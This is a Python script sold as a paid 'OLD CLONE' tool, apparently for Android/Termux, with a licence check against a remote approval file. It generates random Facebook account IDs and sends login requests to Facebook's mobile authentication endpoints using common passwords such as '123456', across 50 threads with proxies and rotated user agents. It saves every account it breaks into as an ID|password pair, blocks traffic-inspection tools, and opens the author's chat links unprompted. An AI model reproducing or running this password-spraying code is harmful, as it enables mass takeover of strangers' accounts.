#paid tool

global _0xloop 
global _0xsave_path  
global _0xproxy_enable  
global _0xproxy_path  
import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime, timedelta

_0xm = ['requests', 'urllib3', 'mechanize', 'rich']
for _0xmod in _0xm:
    try:
        __import__(_0xmod)
    except:
        os.system(f'pip install {_0xmod}')
    else:
        pass

from requests.exceptions import ConnectionError
from requests import api, models, sessions

requests.urllib3.disable_warnings()
os.system('clear')

try:
    _0xapi = open(api.__file__, 'r').read()
    _0xmod = open(models.__file__, 'r').read()
    _0xses = open(sessions.__file__, 'r').read()
    _0xwl = ['print', 'lambda', 'zlib.decompress']
    for _0xw in _0xwl:
        if _0xw in _0xapi or _0xw in _0xmod or _0xw in _0xses:
            exit()
except:
    pass

class _0xsec:
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = '_0xsec'
        _0xp = ['/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py', '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py', '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py']
        for _0xpt in _0xp:
            if os.path.exists(_0xpt) and 'print' in open(_0xpt, 'r').read():
                self._0xf()
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self._0xf()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self._0xf()

    def _0xf(self):
        print(' [1;32m Congratulations ! ')
        os.system('xdg-open  https://www.facebook.com/titer665555111')
        os.system('xdg-open  https://chat.whatsapp.com/HHHZPtQlHXMF9BEu6BqAQH?mode=ems_copy_t')
        print('[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        exit()

_0xmethod = []
_0xoks = []
_0xcps = []
_0xloop = 0
_0xuser = []
_0xproxy_enable = False
_0xsave_path = '/sdcard/'
_0xproxy_path = '/sdcard/proxy.txt'

R = '[1;91m'
G = '[1;92m'
Y = '[1;93m'
B = '[1;94m'
M = '[1;95m'
C = '[1;96m'
W = '[1;97m'

_0xapproval_url = 'https://raw.githubusercontent.com/SHIHAB-X/OLD-CLONE/main/Approval.txt'
_0xdevice_file = '/sdcard/.device_key'
_0xtrial_file = '/sdcard/.trial_key'

def _0xget_device_id():
    """Generate unique device ID"""
    try:
        if os.path.exists(_0xdevice_file):
            with open(_0xdevice_file, 'r') as f:
                return f.read().strip()
        else:
            _0xd1 = str(uuid.getnode())
            _0xd2 = str(uuid.uuid4())
            _0xraw = f'{_0xd1}{_0xd2}'
            _0xdevice = hashlib.sha256(_0xraw.encode()).hexdigest()[:32].upper()
            with open(_0xdevice_file, 'w') as f:
                f.write(_0xdevice)
            return _0xdevice
    except:
        return str(uuid.uuid4()).replace('-', '').upper()[:32]

def _0xcheck_trial():
    """Check if trial period is valid"""
    try:
        if os.path.exists(_0xtrial_file):
            with open(_0xtrial_file, 'r') as f:
                _0xtrial_data = f.read().strip()
                if '|' in _0xtrial_data:
                    _0xstart_date = _0xtrial_data.split('|')[0]
                    _0xstart = datetime.strptime(_0xstart_date, '%Y-%m-%d')
                    _0xnow = datetime.now()
                    _0xdiff = (_0xnow - _0xstart).days
                    if _0xdiff <= 7:
                        return (True, 7 - _0xdiff)
        return (False, 0)  # Yeh line add ki hai - always tuple return karega
    except:
        return (False, 0)  # Yeh bhi ensure karta hai ki always tuple return ho

def _0xstart_trial():
    """Start 7 days trial"""
    try:
        _0xstart = datetime.now().strftime('%Y-%m-%d')
        with open(_0xtrial_file, 'w') as f:
            f.write(f'{_0xstart}|TRIAL')
        return True
    except:
        return False

def _0xcheck_approval():
    """Check approval from GitHub"""
    try:
        _0xdevice = _0xget_device_id()
        _0xresp = requests.get(_0xapproval_url, timeout=10).text
        for _0xline in _0xresp.splitlines():
            if '|' in _0xline:
                _0xparts = _0xline.strip().split('|')
                if len(_0xparts) >= 3:
                    _0xkey = _0xparts[0].strip()
                    _0xdays = _0xparts[1].strip()
                    _0xdate = _0xparts[2].strip()
                    if _0xkey == _0xdevice:
                        try:
                            _0xexpiry = datetime.strptime(_0xdate, '%Y-%m-%d')
                            _0xnow = datetime.now()
                            if _0xnow <= _0xexpiry:
                                _0xremaining = (_0xexpiry - _0xnow).days
                                return (True, _0xremaining, _0xdays)
                        except:
                            pass
        return (False, 0, '0')
    except:
        return (False, 0, '0')

def _0xapproval_screen():
    """Main approval verification screen"""
    _0xbanner()
    _0xdevice = _0xget_device_id()
    _0xapproved, _0xremaining, _0xplan = _0xcheck_approval()
    if _0xapproved:
        print(f'{G}[✓] APPROVAL STATUS: APPROVED')
        print(f'{G}[✓] DEVICE KEY: {W}{_0xdevice}')
        print(f'{G}[✓] PLAN: {W}{_0xplan} DAYS')
        print(f'{G}[✓] REMAINING: {W}{_0xremaining} DAYS')
        _0xline()
        input(f'{Y}[{W}*{Y}]{W} PRESS ENTER TO CONTINUE...')
        return True
    
    # Yeh line fix ki hai - ab _0xcheck_trial() hamesha tuple return karega
    _0xtrial_active, _0xtrial_days = _0xcheck_trial()
    
    if _0xtrial_active:
        print(f'{Y}[!] TRIAL MODE ACTIVE')
        print(f'{Y}[!] DEVICE KEY: {W}{_0xdevice}')
        print(f'{Y}[!] TRIAL REMAINING: {W}{_0xtrial_days} DAYS')
        _0xline()
        print(f'{C}[{W}*{C}]{W} CONTACT ADMIN FOR PREMIUM ACCESS')
        print(f'{C}[{W}*{C}]{W} SEND YOUR DEVICE KEY TO GET APPROVAL')
        _0xline()
        input(f'{Y}[{W}*{Y}]{W} PRESS ENTER TO CONTINUE...')
        return True
    
    print(f'{Y}[!] NO APPROVAL FOUND')
    print(f'{Y}[!] YOUR DEVICE KEY: {W}{_0xdevice}')
    _0xline()
    print(f'{C}[{W}1{C}]{W} START 7 DAYS FREE TRIAL')
    print(f'{C}[{W}2{C}]{W} CONTACT ADMIN FOR APPROVAL')
    print(f'{C}[{W}0{C}]{W} EXIT')
    _0xline()
    _0xchoice = input(f'{Y}[{W}?{Y}]{W} CHOICE: {G}')
    if _0xchoice in ['1', '01']:
        if _0xstart_trial():
            print(f'\n{G}[✓] TRIAL STARTED SUCCESSFULLY!')
            print(f'{G}[✓] YOU HAVE 7 DAYS FREE ACCESS')
            time.sleep(2)
            return True
        print(f'\n{R}[✗] FAILED TO START TRIAL')
        time.sleep(2)
        return False
    if _0xchoice in ['2', '02']:
        print(f'\n{C}[*] CONTACT ADMIN:')
        print(f'{W}    WhatsApp: +8801866365167')
        print(f'{W}    Telegram: https://t.me/+XZvzq-h8IPlkMWI1')
        print(f'\n{C}[*] SEND THIS KEY: {G}{_0xdevice}')
        input(f'\n{Y}[{W}*{Y}]{W} PRESS ENTER TO EXIT...')
        return False
    return False

def _0xwin():
    _0xaV = str(random.choice(range(10, 20)))
    _0xA = f'Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{_0xaV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{_0xaV}'
    _0xbV = str(random.choice(range(1, 36)))
    _0xbx = str(random.choice(range(34, 38)))
    _0xbz = f'5{_0xbx}.{_0xbV}'
    _0xB = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{_0xbz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{_0xbz}"
    _0xcV = str(random.choice(range(1, 36)))
    _0xcx = str(random.choice(range(34, 38)))
    _0xcz = f'5{_0xcx}.{_0xcV}'
    _0xC = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{_0xcz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{_0xcz}"
    _0xD = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36'
    return random.choice([_0xA, _0xB, _0xC, _0xD])

def _0xwin1():
    _0xaV = str(random.choice(range(10, 20)))
    _0xA = f'Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{_0xaV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{_0xaV}'
    _0xbV = str(random.choice(range(1, 36)))
    _0xbx = str(random.choice(range(34, 38)))
    _0xbz = f'5{_0xbx}.{_0xbV}'
    _0xB = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{_0xbz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{_0xbz}"
    _0xcV = str(random.choice(range(1, 36)))
    _0xcx = str(random.choice(range(34, 38)))
    _0xcz = f'5{_0xcx}.{_0xcV}'
    _0xC = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{_0xcz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{_0xcz}"
    _0xlb = rr(6000, 9000)
    _0xlp = rr(100, 200)
    _0xD = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{_0xlb}.{_0xlp} Safari/537.36"
    return random.choice([_0xA, _0xB, _0xC, _0xD])

sys.stdout.write(']2;OLD CLONE TOOL\a')
os.system('xdg-open  https://chat.whatsapp.com/HHHZPtQlHXMF9BEu6BqAQH?mode=ems_copy_t')

def _0xbanner():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
    print('[38;5;46m ▗▄▄▄▖▗▖    ▗▄▖  ▗▄▄▖▗▖ ▗▖')
    print('[38;5;47m ▐▌   ▐▌   ▐▌ ▐▌▐▌   ▐▌ ▐▌')
    print('[38;5;48m ▐▛▀▀▘▐▌   ▐▛▀▜▌ ▝▀▚▖▐▛▀▜▌')
    print('[38;5;49m ▐▌   ▐▙▄▄▖▐▌ ▐▌▗▄▄▞▘▐▌ ▐▌')
    print(f'{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f'{W} ⚡ {Y}DEVELOPER {W}: {G}MR FLASH')
    print(f'{W} ⚡ {Y}VERSION   {W}: {G}2.0 PREMIUM')
    print(f'{W} ⚡ {Y}GITHUB    {W}: {G}SHIHAB')
    print(f'{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}')

def _0xcry(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return '2009'
        if uid.startswith('100000000'):
            return '2009'
        if uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid.startswith('100001'):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
        return ''
    if len(uid) in [9, 10]:
        return '2008'
    if len(uid) == 8:
        return '2007'
    if len(uid) == 7:
        return '2006'
    if len(uid) == 14 and uid.startswith('61'):
        return '2024'
    return ''

def _0xclear():
    os.system('clear')

def _0xline():
    print(f'{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}')
    os.system('xdg-open  https://www.facebook.com/titer665555111')

def _0xload_proxies():
    """Load proxies from file"""
    try:
        if os.path.exists(_0xproxy_path):
            with open(_0xproxy_path, 'r') as f:
                _0xproxies = [line.strip() for line in f if line.strip()]
                return _0xproxies
    except:
        pass
    return []

def _0xget_proxy():
    """Get random proxy"""
    if _0xproxy_enable:
        _0xproxies = _0xload_proxies()
        if _0xproxies:
            _0xproxy = random.choice(_0xproxies)
            return {'http': f'http://{_0xproxy}', 'https': f'http://{_0xproxy}'}
    return None

def _0xmain():
    _0xbanner()
    print(f'{C}[{W}1{C}]{W} OLD CLONE')
    print(f'{C}[{W}2{C}]{W} SETTINGS')
    _0xline()
    _0xinp = input(f'{Y}[{W}?{Y}]{W} CHOICE: {G}')
    if _0xinp in ['1', '01']:
        _0xold()
    elif _0xinp in ['2', '02']:
        _0xsettings()
    else:
        print(f'\n{R}[!] Invalid Option')
        time.sleep(2)
        _0xmain()

def _0xsettings():
    global _0xproxy_path
    global _0xproxy_enable
    global _0xsave_path
    _0xbanner()
    print(f"{Y}[{W}*{Y}]{W} PROXY: {G}{('ENABLED' if _0xproxy_enable else 'DISABLED')}")
    print(f'{Y}[{W}*{Y}]{W} SAVE PATH: {G}{_0xsave_path}')
    if _0xproxy_enable:
        print(f'{Y}[{W}*{Y}]{W} PROXY FILE: {G}{_0xproxy_path}')
        _0xproxies = _0xload_proxies()
        print(f'{Y}[{W}*{Y}]{W} LOADED PROXIES: {G}{len(_0xproxies)}')
    _0xline()
    print(f'{C}[{W}1{C}]{W} TOGGLE PROXY')
    print(f'{C}[{W}2{C}]{W} CHANGE SAVE PATH')
    print(f'{C}[{W}3{C}]{W} CHANGE PROXY FILE PATH')
    print(f'{C}[{W}4{C}]{W} VIEW APPROVAL INFO')
    print(f'{C}[{W}5{C}]{W} BACK TO MENU')
    _0xline()
    _0xch = input(f'{Y}[{W}?{Y}]{W} CHOICE: {G}')
    if _0xch in ['1', '01']:
        _0xproxy_enable = not _0xproxy_enable
        print(f"{G}[+] Proxy {('ENABLED' if _0xproxy_enable else 'DISABLED')}")
        if _0xproxy_enable:
            print(f'{Y}[!] Make sure proxy file exists at: {_0xproxy_path}')
        time.sleep(2)
        _0xsettings()
    elif _0xch in ['2', '02']:
        print(f'\n{Y}[{W}*{Y}]{W} EXAMPLE: /sdcard/ or /sdcard/Download/')
        _0xnew = input(f'{Y}[{W}?{Y}]{W} NEW PATH: {G}')
        if _0xnew:
            _0xsave_path = _0xnew if _0xnew.endswith('/') else _0xnew + '/'
            print(f'{G}[+] Path changed to: {_0xsave_path}')
        time.sleep(2)
        _0xsettings()
    elif _0xch in ['3', '03']:
        print(f'\n{Y}[{W}*{Y}]{W} CURRENT: {_0xproxy_path}')
        print(f'{Y}[{W}*{Y}]{W} EXAMPLE: /sdcard/proxy.txt')
        _0xnew = input(f'{Y}[{W}?{Y}]{W} NEW PROXY FILE PATH: {G}')
        if _0xnew:
            _0xproxy_path = _0xnew
            print(f'{G}[+] Proxy file path changed to: {_0xproxy_path}')
        time.sleep(2)
        _0xsettings()
    elif _0xch in ['4', '04']:
        _0xbanner()
        _0xdevice = _0xget_device_id()
        _0xapproved, _0xremaining, _0xplan = _0xcheck_approval()
        print(f'{C}[*] YOUR DEVICE KEY: {G}{_0xdevice}')
        if _0xapproved:
            print(f'{G}[✓] STATUS: APPROVED')
            print(f'{G}[✓] PLAN: {_0xplan} DAYS')
            print(f'{G}[✓] REMAINING: {_0xremaining} DAYS')
        else:
            _0xtrial, _0xtdays = _0xcheck_trial()
            if _0xtrial:
                print(f'{Y}[!] STATUS: TRIAL MODE')
                print(f'{Y}[!] REMAINING: {_0xtdays} DAYS')
            else:
                print(f'{R}[✗] STATUS: NOT APPROVED')
        _0xline()
        input(f'{Y}[{W}*{Y}]{W} PRESS ENTER TO GO BACK...')
        _0xsettings()
    elif _0xch in ['5', '05']:
        _0xmain()
    else:
        _0xsettings()

def _0xold():
    _0xbanner()
    print(f'{C}[{W}1{C}]{W} ALL SERIES')
    print(f'{C}[{W}2{C}]{W} 100003/4 SERIES')
    print(f'{C}[{W}3{C}]{W} 2009 SERIES')
    _0xline()
    _0xi = input(f'{Y}[{W}?{Y}]{W} CHOICE: {G}')
    if _0xi in ['1', '01']:
        _0xone()
    elif _0xi in ['2', '02']:
        _0xtwo()
    elif _0xi in ['3', '03']:
        _0xtree()
    else:
        print(f'\n{R}[!] Invalid Option')
        time.sleep(1)
        _0xold()

def _0xone():
    _0xu = []
    _0xbanner()
    print(f'{Y}[{W}*{Y}]{W} OLD CODE: {G}2010-2014')
    _0xask = input(f'{Y}[{W}?{Y}]{W} SELECT: {G}')
    _0xline()
    _0xbanner()
    print(f'{Y}[{W}*{Y}]{W} EXAMPLE: {G}20000 / 30000 / 99999')
    _0xlim = input(f'{Y}[{W}?{Y}]{W} LIMIT: {G}')
    _0xline()
    _0xstar = '10000'
    for _ in range(int(_0xlim)):
        _0xdata = str(random.choice(range(1000000000, 1999999999 if _0xask == '1' else 4999999999)))
        _0xu.append(_0xdata)
    print(f'{C}[{W}A{C}]{W} METHOD 1')
    print(f'{C}[{W}B{C}]{W} METHOD 2')
    _0xline()
    _0xmeth = input(f'{Y}[{W}?{Y}]{W} CHOICE (A/B): {G}').strip().upper()
    with tred(max_workers=50) as _0xp:
        _0xbanner()
        print(f'{Y}[{W}*{Y}]{W} TOTAL IDS: {G}{_0xlim}')
        print(f'{Y}[{W}*{Y}]{W} USE AIRPLANE MODE FOR BETTER RESULTS')
        _0xline()
        for _0xmal in _0xu:
            _0xuid = _0xstar + _0xmal
            if _0xmeth == 'A':
                _0xp.submit(_0xlogin1, _0xuid)
            elif _0xmeth == 'B':
                _0xp.submit(_0xlogin2, _0xuid)
            else:
                print(f'{R}[!] INVALID METHOD')
                break

def _0xtwo():
    _0xu = []
    _0xbanner()
    print(f'{Y}[{W}*{Y}]{W} OLD CODE: {G}2010-2014')
    _0xask = input(f'{Y}[{W}?{Y}]{W} SELECT: {G}')
    _0xline()
    _0xbanner()
    print(f'{Y}[{W}*{Y}]{W} EXAMPLE: {G}20000 / 30000 / 99999')
    _0xlim = input(f'{Y}[{W}?{Y}]{W} LIMIT: {G}')
    _0xline()
    _0xpre = ['100003', '100004']
    for _ in range(int(_0xlim)):
        _0xpf = random.choice(_0xpre)
        _0xsf = ''.join(random.choices('0123456789', k=9))
        _0xuid = _0xpf + _0xsf
        _0xu.append(_0xuid)
    print(f'{C}[{W}A{C}]{W} METHOD A')
    print(f'{C}[{W}B{C}]{W} METHOD B')
    _0xline()
    _0xmeth = input(f'{Y}[{W}?{Y}]{W} CHOICE (A/B): {G}').strip().upper()
    with tred(max_workers=50) as _0xp:
        _0xbanner()
        print(f'{Y}[{W}*{Y}]{W} TOTAL IDS: {G}{_0xlim}')
        print(f'{Y}[{W}*{Y}]{W} USE AIRPLANE MODE FOR BETTER RESULTS')
        _0xline()
        for _0xuid in _0xu:
            if _0xmeth == 'A':
                _0xp.submit(_0xlogin1, _0xuid)
            elif _0xmeth == 'B':
                _0xp.submit(_0xlogin2, _0xuid)
            else:
                print(f'{R}[!] INVALID METHOD')
                break

def _0xtree():
    _0xu = []
    _0xbanner()
    print(f'{Y}[{W}*{Y}]{W} OLD CODE: {G}2009-2010')
    _0xask = input(f'{Y}[{W}?{Y}]{W} SELECT: {G}')
    _0xline()
    _0xbanner()
    print(f'{Y}[{W}*{Y}]{W} EXAMPLE: {G}20000 / 30000 / 99999')
    _0xlim = input(f'{Y}[{W}?{Y}]{W} LIMIT: {G}')
    _0xline()
    _0xpf = '1000004'
    for _ in range(int(_0xlim)):
        _0xsf = ''.join(random.choices('0123456789', k=8))
        _0xuid = _0xpf + _0xsf
        _0xu.append(_0xuid)
    print(f'{C}[{W}A{C}]{W} METHOD A')
    print(f'{C}[{W}B{C}]{W} METHOD B')
    _0xline()
    _0xmeth = input(f'{Y}[{W}?{Y}]{W} CHOICE (A/B): {G}').strip().upper()
    with tred(max_workers=50) as _0xp:
        _0xbanner()
        print(f'{Y}[{W}*{Y}]{W} TOTAL IDS: {G}{_0xlim}')
        print(f'{Y}[{W}*{Y}]{W} USE AIRPLANE MODE FOR BETTER RESULTS')
        _0xline()
        for _0xuid in _0xu:
            if _0xmeth == 'A':
                _0xp.submit(_0xlogin1, _0xuid)
            elif _0xmeth == 'B':
                _0xp.submit(_0xlogin2, _0xuid)
            else:
                print(f'{R}[!] INVALID METHOD')
                break

def _0xlogin1(uid):
    global _0xloop
    _0xs = requests.session()
    try:
        sys.stdout.write(f'\r{C}[{W}M1{C}]{W} LOOP: {Y}{_0xloop}{W} | OK: {G}{len(_0xoks)}{W}')
        sys.stdout.flush()
        for _0xpw in ['123456', '1234567', '12345678', '123456789']:
            _0xprox = _0xget_proxy()
            _0xd = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': str(uid), 'password': str(_0xpw), 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': str(uuid.uuid4()), 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'auth.login': {'method': 'authenticate', 'fb_api_req_friendly_name': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'fb_api_caller_class': '882a8490361da98702bf97a021ddc14d'}}
            _0xh = {'User-Agent': _0xwin1(), 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '25227', 'X-FB-SIM-HNI': '29752', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            _0xres = _0xs.post('https://b-graph.facebook.com/auth/login', data=_0xd, headers=_0xh, allow_redirects=False, proxies=_0xprox).json()
            if 'session_key' in _0xres:
                print(f'\r{G}[+]{W} UID: {G}{uid}{W} | PASS: {G}{_0xpw}{W} | YEAR: {C}{_0xcry(uid)}')
                open(f'{_0xsave_path}OLD-M1-OK.txt', 'a').write(f'{uid}|{_0xpw}\n')
                _0xoks.append(uid)
                break
            if 'www.facebook.com' in _0xres.get('error', {}).get('message', ''):
                print(f'\r{G}[+]{W} UID: {G}{uid}{W} | PASS: {G}{_0xpw}{W} | YEAR: {C}{_0xcry(uid)}')
                open(f'{_0xsave_path}OLD-M1-OK.txt', 'a').write(f'{uid}|{_0xpw}\n')
                _0xoks.append(uid)
                break
        _0xloop += 1
    except Exception:
        time.sleep(5)

def _0xlogin2(uid):
    global _0xloop
    sys.stdout.write(f'\r{C}[{W}M2{C}]{W} LOOP: {Y}{_0xloop}{W} | OK: {G}{len(_0xoks)}{W}')
    for _0xpw in ['123456', '123123', '1234567', '12345678', '123456789']:
        try:
            with requests.Session() as _0xs:
                _0xprox = _0xget_proxy()
                _0xhd = {'x-fb-connection-bandwidth': str(rr(20000000, 29999999)), 'x-fb-sim-hni': str(rr(20000, 40000)), 'x-fb-net-hni': str(rr(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _0xwin1(), 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                _0xurl = f'https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(_0xpw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true'
                _0xpo = _0xs.get(_0xurl, headers=_0xhd, proxies=_0xprox).json()
                if 'session_key' in str(_0xpo):
                    print(f'\r{G}[+]{W} UID: {G}{uid}{W} | PASS: {G}{_0xpw}{W} | YEAR: {C}{_0xcry(uid)}')
                    open(f'{_0xsave_path}OLD-M2-OK.txt', 'a').write(f'{uid}|{_0xpw}\n')
                    _0xoks.append(uid)
                    break
                if 'session_key' in _0xpo:
                    print(f'\r{G}[+]{W} UID: {G}{uid}{W} | PASS: {G}{_0xpw}{W} | YEAR: {C}{_0xcry(uid)}')
                    open(f'{_0xsave_path}OLD-M2-OK.txt', 'a').write(f'{uid}|{_0xpw}\n')
                    _0xoks.append(uid)
                    break
        except Exception as e:
            pass
    _0xloop += 1

if __name__ == '__main__':
    if _0xapproval_screen():
        _0xmain()